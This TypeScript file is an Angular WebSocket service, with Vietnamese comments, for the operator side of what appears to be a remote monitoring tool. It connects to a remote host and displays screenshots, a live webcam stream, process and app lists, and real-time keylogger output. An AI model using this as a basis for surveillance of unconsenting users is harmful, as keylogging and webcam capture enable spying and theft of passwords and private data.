import { Injectable, signal } from "@angular/core";

@Injectable({ providedIn: "root" })
export class WebSocketService {

  private socket: WebSocket | null = null;

  // =============================
  // Signals
  // =============================
  status = signal<"disconnected" | "connecting" | "connected">("disconnected");

  lastMessage = signal<any>(null);

  screenshotUrl = signal<string | null>(null);
  webcamFrameUrl = signal<string | null>(null);

  processList = signal<any[]>([]);
  appList = signal<any[]>([]);
  keylogList = signal<any[]>([]);

  // Flag để biết binary tiếp theo là screenshot
  expectingScreenshot = false;

  // =============================
  // CONNECT
  // =============================
  connect(ip: string, port: number) {
    const url = `ws://${ip}:${port}`;
    console.log("Connecting WS:", url);

    this.socket = new WebSocket(url);
    this.socket.binaryType = "arraybuffer";

    this.status.set("connecting");

    this.socket.onopen = () => this.status.set("connected");
    this.socket.onerror = () => this.status.set("disconnected");
    this.socket.onclose = () => this.status.set("disconnected");

    this.socket.onmessage = (event) => {
      // BINARY
      if (event.data instanceof ArrayBuffer) {
        this.handleBinary(event.data);
        return;
      }

      // JSON
      try {
        const msg = JSON.parse(event.data);
        this.lastMessage.set(msg);
        this.routeJSON(msg);
      } catch (err) {
        console.error("JSON parse error:", err);
      }
    };
  }

  // =============================
  // SEND JSON
  // =============================
  sendJson(data: any) {
    if (!this.socket || this.status() !== "connected") return;
    if (data.module === "SCREEN" && data.command === "CAPTURE_BINARY") {
      // báo hiệu frame tới tiếp theo là screenshot
      this.expectingScreenshot = true;
    }
    this.socket.send(JSON.stringify(data));
  }

  // =============================
  // ROUTE JSON
  // =============================
  private routeJSON(msg: any) {

    // PROCESS
    if (msg.module === "PROCESS" && msg.command === "LIST") {
      this.processList.set(msg.data?.process_list || []);
      return;
    }

    // APP
  // APP LIST (backend trả: apps: [...] )
if (msg.module === "APP" && msg.command === "LIST") {
  if (Array.isArray(msg.apps)) {
    this.appList.set(msg.apps);   // <-- chính xác theo JSON bạn gửi
    return;
  }
  console.warn("APP LIST: format không đúng", msg);
  return;
}

    // KEYLOGGER realtime
    if (msg.module === "KEYBOARD" || msg.module === "KEYLOGGER") {

      if (msg.command === "PRESS") {
        const entry = {
          id: Date.now(),
          timestamp: new Date().toLocaleTimeString(),
          text: msg.data?.key || ""
        };
        this.keylogList.update(x => [...x, entry]);
      }

      if (msg.command === "GET_LOG") {
        this.keylogList.set(msg.data || []);
      }

      return;
    }

    // SYSTEM
    if (msg.module === "SYSTEM") {
      console.log("SYSTEM:", msg);
      return;
    }

    console.warn("Unhandled JSON:", msg);
  }

  // =============================
  // HANDLE BINARY STREAM
  // =============================
  private handleBinary(buff: ArrayBuffer) {

    // Nếu quá nhỏ → bỏ
    if (buff.byteLength < 50) return;

    // Nếu đang chụp screenshot
    if (this.expectingScreenshot) {
      this.expectingScreenshot = false;

      const blob = new Blob([buff], { type: "image/jpeg" });
      const url = URL.createObjectURL(blob);

      this.screenshotUrl.set(url);
      return;
    }

    // Mặc định = WEBCAM STREAM
    const blob = new Blob([buff], { type: "image/jpeg" });
    const url = URL.createObjectURL(blob);

    this.webcamFrameUrl.set(url);
  }
}
